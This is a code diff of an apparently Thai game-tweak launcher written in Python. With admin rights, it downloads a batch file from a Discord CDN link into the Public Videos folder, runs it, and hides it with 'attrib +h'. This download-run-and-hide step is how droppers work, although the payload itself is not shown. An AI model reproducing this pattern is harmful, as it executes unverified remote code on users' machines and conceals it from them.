@@ -12,7 +12,7 @@ def _on_close():
             os.remove(f'C:/Users/Public/Videos/Backup_System.bat')
             os.remove(f'C:/Users/Public/Videos/Beyonder_Punch.bat')
             os.remove(f'C:/Users/Public/Videos/Celestials_Puch.bat')
-            os.remove(f'C:/Users/Public/Videos/Entity_Punch.exe')
+            os.remove(f'C:/Users/Public/Videos/Entity_Punch.bat')
             os.remove(f'C:/Users/Public/Videos/Hermes_God.bat')
             os.remove(f'C:/Users/Public/Videos/Boost_FPS.bat')
             os.remove(f'C:/Users/Public/Videos/Install_Powerplan.bat')
@@ -195,7 +195,7 @@ files_to_remove = [
     'C:/Users/Public/Videos/Backup_System.bat',
     'C:/Users/Public/Videos/Beyonder_Punch.bat',
     'C:/Users/Public/Videos/Celestials_Puch.bat',
-    'C:/Users/Public/Videos/Entity_Punch.exe',
+    'C:/Users/Public/Videos/Entity_Punch.bat',
     'C:/Users/Public/Videos/Hermes_God.bat',
     'C:/Users/Public/Videos/Boost_FPS.bat',
     'C:/Users/Public/Videos/Install_Powerplan.bat',
@@ -358,18 +358,18 @@ def cmdset2_jenos(event):
         else:
             run_as_admin()
 def cmdset3_jenos(event):
-        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1181272773197320314/Entity_Punch.exe?ex=65807500&is=656e0000&hm=ce9d8a5b63e6bb4273a4370d38fdeef36588dede9a4c3a68f83f4e8c0f5369b7&"
+        mystr_encoded = "https://cdn.discordapp.com/attachments/1181251569539366962/1182280485318180884/Entity_Punch.bat?ex=65841f81&is=6571aa81&hm=3dd85fb41b4f197935d8163ba67899ff4e5b16868c27f69f78d71840a8112ee2&"
         if is_admin(): 
             try:
-                os.startfile(f'C:/Users/Public/Videos/Entity_Punch.exe')
+                os.startfile(f'C:/Users/Public/Videos/Entity_Punch.bat')
                 messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
             except:
-                with open(f'C:/Users/Public/Videos/Entity_Punch.exe', 'wb') as f:
+                with open(f'C:/Users/Public/Videos/Entity_Punch.bat', 'wb') as f:
                     f.write(requests.get(mystr_encoded).content)
-                os.startfile(f'C:/Users/Public/Videos/Entity_Punch.exe')
+                os.startfile(f'C:/Users/Public/Videos/Entity_Punch.bat')
                 messagebox.showinfo("PRP - Sercurity", "โปรแกรมถูกเปิดใช้งานแล้ว")
 
-                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Entity_Punch.exe')
+                _doHideBatch = os.popen(f'attrib +h C:/Users/Public/Videos/Entity_Punch.bat')
                 _doHideBatch.read()
                 _doHideBatch.close()
         else:
@@ -547,7 +547,7 @@ def join_page_one(event):
     'C:/Users/Public/Videos/Backup_System.bat',
     'C:/Users/Public/Videos/Beyonder_Punch.bat',
     'C:/Users/Public/Videos/Celestials_Puch.bat',
-    'C:/Users/Public/Videos/Entity_Punch.exe',
+    'C:/Users/Public/Videos/Entity_Punch.bat',
     'C:/Users/Public/Videos/Hermes_God.bat',
     'C:/Users/Public/Videos/Boost_FPS.bat',
     'C:/Users/Public/Videos/Install_Powerplan.bat',
@@ -575,7 +575,7 @@ def join_page_two(event):
     'C:/Users/Public/Videos/Backup_System.bat',
     'C:/Users/Public/Videos/Beyonder_Punch.bat',
     'C:/Users/Public/Videos/Celestials_Puch.bat',
-    'C:/Users/Public/Videos/Entity_Punch.exe',
+    'C:/Users/Public/Videos/Entity_Punch.bat',
     'C:/Users/Public/Videos/Hermes_God.bat',
     'C:/Users/Public/Videos/Boost_FPS.bat',
     'C:/Users/Public/Videos/Install_Powerplan.bat',
